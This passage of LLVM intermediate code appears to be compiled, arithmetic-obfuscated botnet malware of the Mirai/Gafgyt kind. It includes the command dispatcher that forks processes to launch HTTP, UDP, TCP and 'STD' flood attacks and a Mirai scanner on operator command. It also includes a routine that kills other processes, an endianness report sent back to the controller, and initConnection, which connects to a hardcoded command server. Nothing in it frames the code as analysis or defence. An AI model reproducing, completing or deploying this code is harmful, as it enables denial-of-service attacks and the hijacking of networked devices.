  %231 = add nsw i32 %226, 1
  store i32 %230, i32* %12, align 4
  br label %193

; <label>:232:                                    ; preds = %193
  br label %233

; <label>:233:                                    ; preds = %232, %165
  %234 = load i8**, i8*** %4, align 8
  %235 = getelementptr inbounds i8*, i8** %234, i64 1
  %236 = load i8*, i8** %235, align 8
  %237 = call i32 @strcmp(i8* %236, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.550, i32 0, i32 0)) #9
  %238 = icmp ne i32 %237, 0
  br i1 %238, label %246, label %239

; <label>:239:                                    ; preds = %233
  %240 = load i32, i32* @scanPid, align 4
  %241 = icmp eq i32 %240, 0
  br i1 %241, label %242, label %243

; <label>:242:                                    ; preds = %239
  br label %663

; <label>:243:                                    ; preds = %239
  %244 = load i32, i32* @scanPid, align 4
  %245 = call i32 @kill(i32 %244, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %246

; <label>:246:                                    ; preds = %243, %233
  %247 = load i8**, i8*** %4, align 8
  %248 = getelementptr inbounds i8*, i8** %247, i64 1
  %249 = load i8*, i8** %248, align 8
  %250 = call i32 @strcmp(i8* %249, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.551, i32 0, i32 0)) #9
  %251 = icmp ne i32 %250, 0
  br i1 %251, label %269, label %252

; <label>:252:                                    ; preds = %246
  %253 = load i8**, i8*** %4, align 8
  %254 = getelementptr inbounds i8*, i8** %253, i64 1
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @atoi(i8* %255) #9
  store i32 %256, i32* %15, align 4
  %257 = load i8**, i8*** %4, align 8
  %258 = getelementptr inbounds i8*, i8** %257, i64 2
  %259 = load i8*, i8** %258, align 8
  %260 = call i32 @atoi(i8* %259) #9
  store i32 %260, i32* %16, align 4
  %261 = call i32 @listFork()
  %262 = icmp ne i32 %261, 0
  br i1 %262, label %268, label %263

; <label>:263:                                    ; preds = %252
  %264 = load i32, i32* @mainCommSock, align 4
  %265 = call i32 (i32, i8*, ...) @sockprintf(i32 %264, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.554, i32 0, i32 0))
  %266 = load i32, i32* %16, align 4
  %267 = load i32, i32* %15, align 4
  call void @MiraiScanner(i32 %266, i32 %267)
  call void @_exit(i32 0) #11
  unreachable

; <label>:268:                                    ; preds = %252
  br label %663

; <label>:269:                                    ; preds = %246
  br label %270

; <label>:270:                                    ; preds = %269, %159
  %271 = load i8**, i8*** %4, align 8
  %272 = getelementptr inbounds i8*, i8** %271, i64 0
  %273 = load i8*, i8** %272, align 8
  %274 = call i32 @strcmp(i8* %273, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.555, i32 0, i32 0)) #9
  %275 = icmp ne i32 %274, 0
  br i1 %275, label %319, label %276

; <label>:276:                                    ; preds = %270
  %277 = load i32, i32* %3, align 4
  %278 = icmp slt i32 %277, 6
  br i1 %278, label %291, label %279

; <label>:279:                                    ; preds = %276
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 3
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282) #9
  %284 = icmp slt i32 %283, 1
  br i1 %284, label %291, label %285

; <label>:285:                                    ; preds = %279
  %286 = load i8**, i8*** %4, align 8
  %287 = getelementptr inbounds i8*, i8** %286, i64 5
  %288 = load i8*, i8** %287, align 8
  %289 = call i32 @atoi(i8* %288) #9
  %290 = icmp slt i32 %289, 1
  br i1 %290, label %291, label %292

; <label>:291:                                    ; preds = %285, %279, %276
  br label %663

; <label>:292:                                    ; preds = %285
  %293 = call i32 @listFork()
  %294 = icmp ne i32 %293, 0
  br i1 %294, label %295, label %296

; <label>:295:                                    ; preds = %292
  br label %663

; <label>:296:                                    ; preds = %292
  %297 = load i8**, i8*** %4, align 8
  %298 = getelementptr inbounds i8*, i8** %297, i64 1
  %299 = load i8*, i8** %298, align 8
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 2
  %302 = load i8*, i8** %301, align 8
  %303 = load i8**, i8*** %4, align 8
  %304 = getelementptr inbounds i8*, i8** %303, i64 3
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 @atoi(i8* %305) #9
  %307 = trunc i32 %306 to i16
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 4
  %310 = load i8*, i8** %309, align 8
  %311 = load i8**, i8*** %4, align 8
  %312 = getelementptr inbounds i8*, i8** %311, i64 5
  %313 = load i8*, i8** %312, align 8
  %314 = call i32 @atoi(i8* %313) #9
  %315 = load i8**, i8*** %4, align 8
  %316 = getelementptr inbounds i8*, i8** %315, i64 6
  %317 = load i8*, i8** %316, align 8
  %318 = call i32 @atoi(i8* %317) #9
  call void @SendHTTP(i8* %299, i8* %302, i16 zeroext %307, i8* %310, i32 %314, i32 %318)
  call void @exit(i32 0) #12
  unreachable

; <label>:319:                                    ; preds = %270
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 0
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @strcmp(i8* %322, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.556, i32 0, i32 0)) #9
  %324 = icmp ne i32 %323, 0
  br i1 %324, label %422, label %325

; <label>:325:                                    ; preds = %319
  %326 = load i32, i32* %3, align 4
  %327 = icmp slt i32 %326, 6
  br i1 %327, label %361, label %328

; <label>:328:                                    ; preds = %325
  %329 = load i8**, i8*** %4, align 8
  %330 = getelementptr inbounds i8*, i8** %329, i64 3
  %331 = load i8*, i8** %330, align 8
  %332 = call i32 @atoi(i8* %331) #9
  %333 = icmp eq i32 %332, -1
  br i1 %333, label %361, label %334

; <label>:334:                                    ; preds = %328
  %335 = load i8**, i8*** %4, align 8
  %336 = getelementptr inbounds i8*, i8** %335, i64 2
  %337 = load i8*, i8** %336, align 8
  %338 = call i32 @atoi(i8* %337) #9
  %339 = icmp eq i32 %338, -1
  br i1 %339, label %361, label %340

; <label>:340:                                    ; preds = %334
  %341 = load i8**, i8*** %4, align 8
  %342 = getelementptr inbounds i8*, i8** %341, i64 4
  %343 = load i8*, i8** %342, align 8
  %344 = call i32 @atoi(i8* %343) #9
  %345 = icmp eq i32 %344, -1
  br i1 %345, label %361, label %346

; <label>:346:                                    ; preds = %340
  %347 = load i8**, i8*** %4, align 8
  %348 = getelementptr inbounds i8*, i8** %347, i64 4
  %349 = load i8*, i8** %348, align 8
  %350 = call i32 @atoi(i8* %349) #9
  %351 = icmp sgt i32 %350, 1024
  br i1 %351, label %361, label %352

; <label>:352:                                    ; preds = %346
  %353 = load i32, i32* %3, align 4
  %354 = icmp eq i32 %353, 6
  br i1 %354, label %355, label %362

; <label>:355:                                    ; preds = %352
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 5
  %358 = load i8*, i8** %357, align 8
  %359 = call i32 @atoi(i8* %358) #9
  %360 = icmp slt i32 %359, 1
  br i1 %360, label %361, label %362

; <label>:361:                                    ; preds = %355, %346, %340, %334, %328, %325
  br label %663

; <label>:362:                                    ; preds = %355, %352
  %363 = load i8**, i8*** %4, align 8
  %364 = getelementptr inbounds i8*, i8** %363, i64 1
  %365 = load i8*, i8** %364, align 8
  store i8* %365, i8** %17, align 8
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 2
  %368 = load i8*, i8** %367, align 8
  %369 = call i32 @atoi(i8* %368) #9
  store i32 %369, i32* %18, align 4
  %370 = load i8**, i8*** %4, align 8
  %371 = getelementptr inbounds i8*, i8** %370, i64 3
  %372 = load i8*, i8** %371, align 8
  %373 = call i32 @atoi(i8* %372) #9
  store i32 %373, i32* %19, align 4
  %374 = load i8**, i8*** %4, align 8
  %375 = getelementptr inbounds i8*, i8** %374, i64 4
  %376 = load i8*, i8** %375, align 8
  %377 = call i32 @atoi(i8* %376) #9
  store i32 %377, i32* %20, align 4
  %378 = load i32, i32* %3, align 4
  %379 = icmp eq i32 %378, 6
  br i1 %379, label %380, label %385

; <label>:380:                                    ; preds = %362
  %381 = load i8**, i8*** %4, align 8
  %382 = getelementptr inbounds i8*, i8** %381, i64 5
  %383 = load i8*, i8** %382, align 8
  %384 = call i32 @atoi(i8* %383) #9
  br label %386

; <label>:385:                                    ; preds = %362
  br label %386

; <label>:386:                                    ; preds = %385, %380
  %387 = phi i32 [ %384, %380 ], [ 10, %385 ]
  store i32 %387, i32* %21, align 4
  store i32 32, i32* %22, align 4
  %388 = load i8*, i8** %17, align 8
  %389 = call i8* @strstr(i8* %388, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %390 = icmp ne i8* %389, null
  br i1 %390, label %391, label %410

; <label>:391:                                    ; preds = %386
  %392 = load i8*, i8** %17, align 8
  %393 = call i8* @strtok(i8* %392, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %393, i8** %23, align 8
  br label %394

; <label>:394:                                    ; preds = %407, %391
  %395 = load i8*, i8** %23, align 8
  %396 = icmp ne i8* %395, null
  br i1 %396, label %397, label %409

; <label>:397:                                    ; preds = %394
  %398 = call i32 @listFork()
  %399 = icmp ne i32 %398, 0
  br i1 %399, label %407, label %400

; <label>:400:                                    ; preds = %397
  %401 = load i8*, i8** %23, align 8
  %402 = load i32, i32* %18, align 4
  %403 = load i32, i32* %19, align 4
  %404 = load i32, i32* %20, align 4
  %405 = load i32, i32* %21, align 4
  %406 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %401, i32 %402, i32 %403, i32 %404, i32 %405, i32 %406)
  call void @_exit(i32 0) #11
  unreachable

; <label>:407:                                    ; preds = %397
  %408 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %408, i8** %23, align 8
  br label %394

; <label>:409:                                    ; preds = %394
  br label %421

; <label>:410:                                    ; preds = %386
  %411 = call i32 @listFork()
  %412 = icmp ne i32 %411, 0
  br i1 %412, label %413, label %414

; <label>:413:                                    ; preds = %410
  br label %663

; <label>:414:                                    ; preds = %410
  %415 = load i8*, i8** %17, align 8
  %416 = load i32, i32* %18, align 4
  %417 = load i32, i32* %19, align 4
  %418 = load i32, i32* %20, align 4
  %419 = load i32, i32* %21, align 4
  %420 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %415, i32 %416, i32 %417, i32 %418, i32 %419, i32 %420)
  call void @_exit(i32 0) #11
  unreachable

; <label>:421:                                    ; preds = %409
  br label %422

; <label>:422:                                    ; preds = %421, %319
  %423 = load i8**, i8*** %4, align 8
  %424 = getelementptr inbounds i8*, i8** %423, i64 0
  %425 = load i8*, i8** %424, align 8
  %426 = call i32 @strcmp(i8* %425, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.557, i32 0, i32 0)) #9
  %427 = icmp ne i32 %426, 0
  br i1 %427, label %533, label %428

; <label>:428:                                    ; preds = %422
  %429 = load i32, i32* %3, align 4
  %430 = icmp slt i32 %429, 6
  br i1 %430, label %461, label %431

; <label>:431:                                    ; preds = %428
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 3
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @atoi(i8* %434) #9
  %436 = icmp eq i32 %435, -1
  br i1 %436, label %461, label %437

; <label>:437:                                    ; preds = %431
  %438 = load i8**, i8*** %4, align 8
  %439 = getelementptr inbounds i8*, i8** %438, i64 2
  %440 = load i8*, i8** %439, align 8
  %441 = call i32 @atoi(i8* %440) #9
  %442 = icmp eq i32 %441, -1
  br i1 %442, label %461, label %443

; <label>:443:                                    ; preds = %437
  %444 = load i32, i32* %3, align 4
  %445 = icmp sgt i32 %444, 5
  br i1 %445, label %446, label %452

; <label>:446:                                    ; preds = %443
  %447 = load i8**, i8*** %4, align 8
  %448 = getelementptr inbounds i8*, i8** %447, i64 5
  %449 = load i8*, i8** %448, align 8
  %450 = call i32 @atoi(i8* %449) #9
  %451 = icmp slt i32 %450, 0
  br i1 %451, label %461, label %452

; <label>:452:                                    ; preds = %446, %443
  %453 = load i32, i32* %3, align 4
  %454 = icmp eq i32 %453, 7
  br i1 %454, label %455, label %462

; <label>:455:                                    ; preds = %452
  %456 = load i8**, i8*** %4, align 8
  %457 = getelementptr inbounds i8*, i8** %456, i64 6
  %458 = load i8*, i8** %457, align 8
  %459 = call i32 @atoi(i8* %458) #9
  %460 = icmp slt i32 %459, 1
  br i1 %460, label %461, label %462

; <label>:461:                                    ; preds = %455, %446, %437, %431, %428
  br label %663

; <label>:462:                                    ; preds = %455, %452
  %463 = load i8**, i8*** %4, align 8
  %464 = getelementptr inbounds i8*, i8** %463, i64 1
  %465 = load i8*, i8** %464, align 8
  store i8* %465, i8** %24, align 8
  %466 = load i8**, i8*** %4, align 8
  %467 = getelementptr inbounds i8*, i8** %466, i64 2
  %468 = load i8*, i8** %467, align 8
  %469 = call i32 @atoi(i8* %468) #9
  store i32 %469, i32* %25, align 4
  %470 = load i8**, i8*** %4, align 8
  %471 = getelementptr inbounds i8*, i8** %470, i64 3
  %472 = load i8*, i8** %471, align 8
  %473 = call i32 @atoi(i8* %472) #9
  store i32 %473, i32* %26, align 4
  %474 = load i8**, i8*** %4, align 8
  %475 = getelementptr inbounds i8*, i8** %474, i64 4
  %476 = load i8*, i8** %475, align 8
  store i8* %476, i8** %27, align 8
  %477 = load i32, i32* %3, align 4
  %478 = icmp eq i32 %477, 7
  br i1 %478, label %479, label %484

; <label>:479:                                    ; preds = %462
  %480 = load i8**, i8*** %4, align 8
  %481 = getelementptr inbounds i8*, i8** %480, i64 6
  %482 = load i8*, i8** %481, align 8
  %483 = call i32 @atoi(i8* %482) #9
  br label %485

; <label>:484:                                    ; preds = %462
  br label %485

; <label>:485:                                    ; preds = %484, %479
  %486 = phi i32 [ %483, %479 ], [ 10, %484 ]
  store i32 %486, i32* %28, align 4
  %487 = load i32, i32* %3, align 4
  %488 = icmp sgt i32 %487, 5
  br i1 %488, label %489, label %494

; <label>:489:                                    ; preds = %485
  %490 = load i8**, i8*** %4, align 8
  %491 = getelementptr inbounds i8*, i8** %490, i64 5
  %492 = load i8*, i8** %491, align 8
  %493 = call i32 @atoi(i8* %492) #9
  br label %495

; <label>:494:                                    ; preds = %485
  br label %495

; <label>:495:                                    ; preds = %494, %489
  %496 = phi i32 [ %493, %489 ], [ 0, %494 ]
  store i32 %496, i32* %29, align 4
  store i32 32, i32* %30, align 4
  %497 = load i8*, i8** %24, align 8
  %498 = call i8* @strstr(i8* %497, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %499 = icmp ne i8* %498, null
  br i1 %499, label %500, label %520

; <label>:500:                                    ; preds = %495
  %501 = load i8*, i8** %24, align 8
  %502 = call i8* @strtok(i8* %501, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %502, i8** %31, align 8
  br label %503

; <label>:503:                                    ; preds = %517, %500
  %504 = load i8*, i8** %31, align 8
  %505 = icmp ne i8* %504, null
  br i1 %505, label %506, label %519

; <label>:506:                                    ; preds = %503
  %507 = call i32 @listFork()
  %508 = icmp ne i32 %507, 0
  br i1 %508, label %517, label %509

; <label>:509:                                    ; preds = %506
  %510 = load i8*, i8** %31, align 8
  %511 = load i32, i32* %25, align 4
  %512 = load i32, i32* %26, align 4
  %513 = load i8*, i8** %27, align 8
  %514 = load i32, i32* %29, align 4
  %515 = load i32, i32* %28, align 4
  %516 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %510, i32 %511, i32 %512, i8* %513, i32 %514, i32 %515, i32 %516)
  call void @_exit(i32 0) #11
  unreachable

; <label>:517:                                    ; preds = %506
  %518 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %518, i8** %31, align 8
  br label %503

; <label>:519:                                    ; preds = %503
  br label %532

; <label>:520:                                    ; preds = %495
  %521 = call i32 @listFork()
  %522 = icmp ne i32 %521, 0
  br i1 %522, label %523, label %524

; <label>:523:                                    ; preds = %520
  br label %663

; <label>:524:                                    ; preds = %520
  %525 = load i8*, i8** %24, align 8
  %526 = load i32, i32* %25, align 4
  %527 = load i32, i32* %26, align 4
  %528 = load i8*, i8** %27, align 8
  %529 = load i32, i32* %29, align 4
  %530 = load i32, i32* %28, align 4
  %531 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %525, i32 %526, i32 %527, i8* %528, i32 %529, i32 %530, i32 %531)
  call void @_exit(i32 0) #11
  unreachable

; <label>:532:                                    ; preds = %519
  br label %533

; <label>:533:                                    ; preds = %532, %422
  %534 = load i8**, i8*** %4, align 8
  %535 = getelementptr inbounds i8*, i8** %534, i64 0
  %536 = load i8*, i8** %535, align 8
  %537 = call i32 @strcmp(i8* %536, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.558, i32 0, i32 0)) #9
  %538 = icmp ne i32 %537, 0
  br i1 %538, label %595, label %539

; <label>:539:                                    ; preds = %533
  %540 = load i32, i32* %3, align 4
  %541 = icmp slt i32 %540, 4
  br i1 %541, label %554, label %542

; <label>:542:                                    ; preds = %539
  %543 = load i8**, i8*** %4, align 8
  %544 = getelementptr inbounds i8*, i8** %543, i64 2
  %545 = load i8*, i8** %544, align 8
  %546 = call i32 @atoi(i8* %545) #9
  %547 = icmp slt i32 %546, 1
  br i1 %547, label %554, label %548

; <label>:548:                                    ; preds = %542
  %549 = load i8**, i8*** %4, align 8
  %550 = getelementptr inbounds i8*, i8** %549, i64 3
  %551 = load i8*, i8** %550, align 8
  %552 = call i32 @atoi(i8* %551) #9
  %553 = icmp slt i32 %552, 1
  br i1 %553, label %554, label %555

; <label>:554:                                    ; preds = %548, %542, %539
  br label %663

; <label>:555:                                    ; preds = %548
  %556 = load i8**, i8*** %4, align 8
  %557 = getelementptr inbounds i8*, i8** %556, i64 1
  %558 = load i8*, i8** %557, align 8
  store i8* %558, i8** %32, align 8
  %559 = load i8**, i8*** %4, align 8
  %560 = getelementptr inbounds i8*, i8** %559, i64 2
  %561 = load i8*, i8** %560, align 8
  %562 = call i32 @atoi(i8* %561) #9
  store i32 %562, i32* %33, align 4
  %563 = load i8**, i8*** %4, align 8
  %564 = getelementptr inbounds i8*, i8** %563, i64 3
  %565 = load i8*, i8** %564, align 8
  %566 = call i32 @atoi(i8* %565) #9
  store i32 %566, i32* %34, align 4
  %567 = load i8*, i8** %32, align 8
  %568 = call i8* @strstr(i8* %567, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %569 = icmp ne i8* %568, null
  br i1 %569, label %570, label %586

; <label>:570:                                    ; preds = %555
  %571 = load i8*, i8** %32, align 8
  %572 = call i8* @strtok(i8* %571, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %572, i8** %35, align 8
  br label %573

; <label>:573:                                    ; preds = %583, %570
  %574 = load i8*, i8** %35, align 8
  %575 = icmp ne i8* %574, null
  br i1 %575, label %576, label %585

; <label>:576:                                    ; preds = %573
  %577 = call i32 @listFork()
  %578 = icmp ne i32 %577, 0
  br i1 %578, label %583, label %579

; <label>:579:                                    ; preds = %576
  %580 = load i8*, i8** %35, align 8
  %581 = load i32, i32* %33, align 4
  %582 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %580, i32 %581, i32 %582)
  call void @_exit(i32 0) #11
  unreachable

; <label>:583:                                    ; preds = %576
  %584 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %584, i8** %35, align 8
  br label %573

; <label>:585:                                    ; preds = %573
  br label %594

; <label>:586:                                    ; preds = %555
  %587 = call i32 @listFork()
  %588 = icmp ne i32 %587, 0
  br i1 %588, label %589, label %590

; <label>:589:                                    ; preds = %586
  br label %663

; <label>:590:                                    ; preds = %586
  %591 = load i8*, i8** %32, align 8
  %592 = load i32, i32* %33, align 4
  %593 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %591, i32 %592, i32 %593)
  call void @_exit(i32 0) #11
  unreachable

; <label>:594:                                    ; preds = %585
  br label %595

; <label>:595:                                    ; preds = %594, %533
  %596 = load i8**, i8*** %4, align 8
  %597 = getelementptr inbounds i8*, i8** %596, i64 0
  %598 = load i8*, i8** %597, align 8
  %599 = call i32 @strcmp(i8* %598, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.559, i32 0, i32 0)) #9
  %600 = icmp ne i32 %599, 0
  br i1 %600, label %645, label %601

; <label>:601:                                    ; preds = %595
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %602

; <label>:602:                                    ; preds = %632, %601
  %603 = load i64, i64* %37, align 8
  %604 = load i64, i64* @numpids, align 8
  %605 = icmp ult i64 %603, %604
  br i1 %605, label %606, label %639

; <label>:606:                                    ; preds = %602
  %607 = load i32*, i32** @pids, align 8
  %608 = load i64, i64* %37, align 8
  %609 = getelementptr inbounds i32, i32* %607, i64 %608
  %610 = load i32, i32* %609, align 4
  %611 = icmp ne i32 %610, 0
  br i1 %611, label %612, label %631

; <label>:612:                                    ; preds = %606
  %613 = load i32*, i32** @pids, align 8
  %614 = load i64, i64* %37, align 8
  %615 = getelementptr inbounds i32, i32* %613, i64 %614
  %616 = load i32, i32* %615, align 4
  %617 = call i32 @getpid() #5
  %618 = icmp ne i32 %616, %617
  br i1 %618, label %619, label %631

; <label>:619:                                    ; preds = %612
  %620 = load i32*, i32** @pids, align 8
  %621 = load i64, i64* %37, align 8
  %622 = getelementptr inbounds i32, i32* %620, i64 %621
  %623 = load i32, i32* %622, align 4
  %624 = call i32 @kill(i32 %623, i32 9) #5
  %625 = load i32, i32* %36, align 4
  %626 = sub i32 0, %625
  %627 = sub i32 0, 1
  %628 = add i32 %626, %627
  %629 = sub i32 0, %628
  %630 = add nsw i32 %625, 1
  store i32 %629, i32* %36, align 4
  br label %631

; <label>:631:                                    ; preds = %619, %612, %606
  br label %632

; <label>:632:                                    ; preds = %631
  %633 = load i64, i64* %37, align 8
  %634 = sub i64 0, %633
  %635 = sub i64 0, 1
  %636 = add i64 %634, %635
  %637 = sub i64 0, %636
  %638 = add i64 %633, 1
  store i64 %637, i64* %37, align 8
  br label %602

; <label>:639:                                    ; preds = %602
  %640 = load i32, i32* %36, align 4
  %641 = icmp sgt i32 %640, 0
  br i1 %641, label %642, label %643

; <label>:642:                                    ; preds = %639
  br label %644

; <label>:643:                                    ; preds = %639
  br label %644

; <label>:644:                                    ; preds = %643, %642
  br label %645

; <label>:645:                                    ; preds = %644, %595
  %646 = load i8**, i8*** %4, align 8
  %647 = getelementptr inbounds i8*, i8** %646, i64 0
  %648 = load i8*, i8** %647, align 8
  %649 = call i32 @strcmp(i8* %648, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.560, i32 0, i32 0)) #9
  %650 = icmp ne i32 %649, 0
  br i1 %650, label %652, label %651

; <label>:651:                                    ; preds = %645
  call void @exit(i32 0) #12
  unreachable

; <label>:652:                                    ; preds = %645
  %653 = load i8**, i8*** %4, align 8
  %654 = getelementptr inbounds i8*, i8** %653, i64 0
  %655 = load i8*, i8** %654, align 8
  %656 = call i32 @strcmp(i8* %655, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.561, i32 0, i32 0)) #9
  %657 = icmp ne i32 %656, 0
  br i1 %657, label %663, label %658

; <label>:658:                                    ; preds = %652
  call void @RemoveTempDirs()
  %659 = load i32, i32* @mainCommSock, align 4
  %660 = call i8* @getBuild()
  %661 = call i32 @getEndianness()
  %662 = call i32 (i32, i8*, ...) @sockprintf(i32 %659, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.562, i32 0, i32 0), i8* %660, i32 %661)
  br label %663

; <label>:663:                                    ; preds = %658, %652, %589, %554, %523, %461, %413, %361, %295, %291, %268, %242, %190, %185, %157, %131, %75, %70, %43
  ret void
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.565 to i32), i32* %1, align 4
  br label %18

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.566 to i32), i32* %1, align 4
  br label %18

; <label>:15:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.567 to i32), i32* %1, align 4
  br label %18

; <label>:16:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.568 to i32), i32* %1, align 4
  br label %18

; <label>:17:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.569 to i32), i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %16, %15, %14, %13
  %19 = load i32, i32* %1, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 %11, 422222802
  %13 = add i32 %12, 1
  %14 = add i32 %13, 422222802
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = icmp eq i64 %16, 1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %26

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @currentServer, align 4
  %21 = sub i32 0, %20
  %22 = sub i32 0, 1
  %23 = add i32 %21, %22
  %24 = sub i32 0, %23
  %25 = add nsw i32 %20, 1
  store i32 %24, i32* @currentServer, align 4
  br label %26

; <label>:26:                                     ; preds = %19, %18
  %27 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %28 = load i32, i32* @currentServer, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i8* @strcpy(i8* %27, i8* %31) #5
  store i32 23, i32* %3, align 4
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #9
  %35 = icmp ne i8* %34, null
  br i1 %35, label %36, label %43

; <label>:36:                                     ; preds = %26
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #9
  %39 = getelementptr inbounds i8, i8* %38, i64 1
  %40 = call i32 @atoi(i8* %39) #9
  store i32 %40, i32* %3, align 4
  %41 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %42 = call i8* @strchr(i8* %41, i32 58) #9
  store i8 0, i8* %42, align 1
  br label %43

; <label>:43:                                     ; preds = %36, %26
  %44 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %44, i32* @mainCommSock, align 4
  %45 = load i32, i32* @mainCommSock, align 4
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %47 = load i32, i32* %3, align 4
  %48 = call i32 @connectTimeout(i32 %45, i8* %46, i32 %47, i32 30)
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

; <label>:50:                                     ; preds = %43
  store i32 1, i32* %1, align 4
  br label %52

; <label>:51:                                     ; preds = %43
  store i32 0, i32* %1, align 4
  br label %52

; <label>:52:                                     ; preds = %51, %50
  %53 = load i32, i32* %1, align 4
  ret i32 %53
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
